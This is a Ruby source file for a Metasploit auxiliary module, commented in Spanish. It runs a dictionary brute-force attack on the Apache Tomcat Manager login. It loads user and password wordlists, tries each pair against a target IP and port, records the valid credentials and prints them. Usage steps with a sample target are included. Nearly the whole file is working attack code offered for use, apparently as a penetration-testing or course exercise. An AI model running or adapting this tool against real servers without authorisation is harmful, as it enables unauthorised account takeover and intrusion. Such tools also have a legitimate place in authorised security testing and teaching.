#Fernando Marcos Parra Arroyo
#Modulo de metasploit para ataque de diccionario a Tomcat
# 	Entradas: ip y puerto del objetivo, asi como tambien
#   		  el archivo de usuarios y el archivo de passwords 
#			  por defecto tomara los archivos de metasploit
# 	Salidas: muestra en pantalla los resultados de cada intento
# 			 mostrando cuales fueron exitosos y cuales no
#
#Requerimientos:
# 	Este modulo requiere Metasploit http://metasploit.com/download
#
#Ejemplo de uso:
# 	msfconsole
# 	search tomcat_bruteForce
#   use /path/tomcat_bruteForce
#   set RHOSTS 192.168.94.68
#   set RPORT 8180
#   exploit

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/http'


#La clase auxiliar actua como una clase base para todos los modulos que realizan reconocimientos 
#recuperan datos, logins de fuerza bruta que implica cargas y objetivos y otros
class MetasploitModule < Msf::Auxiliary
	#Este modulo proporciona metodos para actuar como un cliente HTTP al explotar un servidor HTTP.
	include Msf::Exploit::Remote::HttpClient
	#Este modulo proporciona mÃ©todos para la autenticacion forzosa bruta
  	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner

  	def initialize
	    super(
	      'Name'           => 'Tomcat bruteforce',
	      'Description'    => 'Este modulo hace un ataque de diccionario contra un tomcat',
	      'Author'         => 'Fernando Parra'
	    )

	    #Elegimos las opciones que no se consideren de importancia para el objetivo
    	deregister_options('VERBOSE','STOP_ON_SUCCESS','SSL','USER_AS_PASS','BLANK_PASSWORDS','BRUTEFORCE_SPEED','Proxies','DB_ALL_PASS','DB_ALL_USERS','DB_ALL_CREDS','THREADS', 'USERPASS_FILE', 'VHOST')

    	#Registro de opciones, se indica si seran requeridas o no, su valor por defecto
	    register_options(
	      [
	        Opt::RPORT(8180),
	        OptString.new('USERNAME', [false, 'Usuario para la autenticacion', '']),
	        OptString.new('PASSWORD', [false, 'Password para la autenticacion', '']),
	        OptString.new('TARGETURI', [true, "URI login del manager, por defecto /manager/html", "/manager/html"]),
	        OptPath.new('USER_FILE',  [ false, "Archivo de usuarios, uno por linea",
	          File.join(Msf::Config.data_directory, "wordlists", "tomcat_mgr_default_users.txt") ]),
	        OptPath.new('PASS_FILE',  [ false, "Archivo de passwords, una por linea",
	          File.join(Msf::Config.data_directory, "wordlists", "tomcat_mgr_default_pass.txt") ]),
	      ], self.class)
  	end

  	def run_host(ip)

  		#Se generan las credenciales, son necesarios archivos de listas de palabras, asi como opciones de nombre de usuario 
  		#y password.Responde a #each y genera credenciales creadas.
	    cred_collection = Metasploit::Framework::CredentialCollection.new(
	      pass_file: datastore['PASS_FILE'],
	      password: datastore['PASSWORD'],
	      user_file: datastore['USER_FILE'],
	      username: datastore['USERNAME']
	    )

    	cred_collection = prepend_db_passwords(cred_collection)


    	#escaner de inicio de sesion de Tomcat Manager
    	# definida en /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/tomcat.rb
	    scanner = Metasploit::Framework::LoginScanner::Tomcat.new(
	    	#Se definen los parametros para el escaneo del login de inicio de sesion con las credenciales creadas
	      configure_http_login_scanner(
	        cred_details: cred_collection,
	        stop_on_success: datastore['STOP_ON_SUCCESS'],
	        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
	        connection_timeout: 10,
	        http_username: datastore['HttpUsername'],
	        http_password: datastore['HttpPassword']
	      )
	    )

	    #Se probaran las ccredenciales generadas con base en los archivos
	    scanner.scan! do |result|
	      credential_data = result.to_h
	      credential_data.merge!(
	          module_fullname: self.fullname,
	          workspace_id: myworkspace_id
	      )
	      	#en caso de que sea exitosa la autenticacion se mostrara en pantalla el nombre de usuario y password valido
			if result.success?
				credential_core = create_credential(credential_data)
				credential_data[:core] = credential_core
				create_credential_login(credential_data)

		        print_good "#{ip}:#{rport} - Credenciales Encontradas: #{result.credential}"
			else
			#en caso de no ser valido se mostrara en pantalla el estado del intento de autenticacion, usuario y password
		        invalidate_login(credential_data)
	            print_error "#{ip}:#{rport} - Credenciales no validas: #{result.credential} (#{result.status})"
	      	end
	    end
	end
end